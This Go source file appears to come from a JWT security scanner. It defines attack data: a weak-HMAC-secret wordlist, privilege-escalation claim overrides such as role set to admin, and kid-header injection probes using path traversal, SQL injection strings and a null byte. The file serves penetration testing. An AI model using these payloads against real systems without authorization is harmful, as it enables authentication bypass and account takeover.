package jwtscan

// weakSecrets is the built-in HMAC-secret brute-force wordlist, ported
// verbatim from JWTear's core/payloads.py so results stay consistent with
// the standalone tool.
var weakSecrets = []string{
	"", "secret", "password", "123456", "jwt", "jwt_secret", "supersecret",
	"mysecret", "changeme", "admin", "token", "key", "private",
	"qwerty", "letmein", "welcome", "monkey", "dragon", "master",
	"your-256-bit-secret", "your-384-bit-secret", "your-512-bit-secret",
	"null", "undefined", "test", "dev", "development", "production",
	"secret123", "password123", "p@ssw0rd", "abc123", "iloveyou",
	"pass", "passwd", "root", "toor", "admin123", "administrator",
	"1234567890", "secretkey", "signingkey", "jwtpassword", "jwtsecret",
	"hmackey", "hs256key", "keykey", "insecure", "weak", "hackthebox",
	"flag", "ctf", "challenge", "demo", "sample", "example",
}

// claimPatch is one privilege-escalation claim override the claim-tampering
// test tries, paired with a human-readable description shown in results.
type claimPatch struct {
	Patch map[string]any
	Desc  string
}

var claimPatches = []claimPatch{
	{map[string]any{"role": "admin"}, `role → "admin"`},
	{map[string]any{"role": "administrator"}, `role → "administrator"`},
	{map[string]any{"is_admin": true}, "is_admin → true"},
	{map[string]any{"isAdmin": true}, "isAdmin → true"},
	{map[string]any{"admin": true}, "admin → true"},
	{map[string]any{"is_staff": true}, "is_staff → true"},
	{map[string]any{"sub": "admin"}, `sub → "admin"`},
	{map[string]any{"username": "admin"}, `username → "admin"`},
	{map[string]any{"user": "admin"}, `user → "admin"`},
	{map[string]any{"group": "admin"}, `group → "admin"`},
	{map[string]any{"scope": "admin read write"}, "scope → admin"},
	{map[string]any{"privilege": "admin"}, `privilege → "admin"`},
	{map[string]any{"level": 0}, "level → 0"},
	{map[string]any{"access": "full"}, `access → "full"`},
}

// kidPayload is one kid-header-injection probe: the value forced into the
// "kid" header, plus the HMAC secret it's signed with (the payload is only
// worth trying if the server resolves "kid" into a secret an attacker can
// predict, e.g. by shelling out or hitting a null/predictable file path).
type kidPayload struct {
	Name   string
	Kid    string
	Secret []byte
}

var kidPayloads = []kidPayload{
	{"path traversal → /dev/null", "../../../../../../dev/null", []byte("")},
	{"path traversal → /proc randomize_va", "../../proc/sys/kernel/randomize_va_space", []byte("2")},
	{"SQL UNION SELECT", "' UNION SELECT 'x'-- -", []byte("x")},
	{"SQL OR 1=1", "' OR 1=1-- -", []byte("")},
	{"SQL boolean blind", "anything' OR '1'='1", []byte("")},
	{"null byte", "\x00", []byte("")},
}

// maxSecretAttempts caps how many secrets the weak-HMAC-secret test will
// try in one scan (built-in list plus any user-supplied wordlist/pasted
// list). Each attempt is a synchronous HTTP round-trip against the target,
// so an unbounded cap paired with a multi-million-line wordlist would hang
// the request indefinitely -- the same reasoning as adapters.maxFuzzRequests
// for ffuf/feroxbuster.
const maxSecretAttempts = 10_000
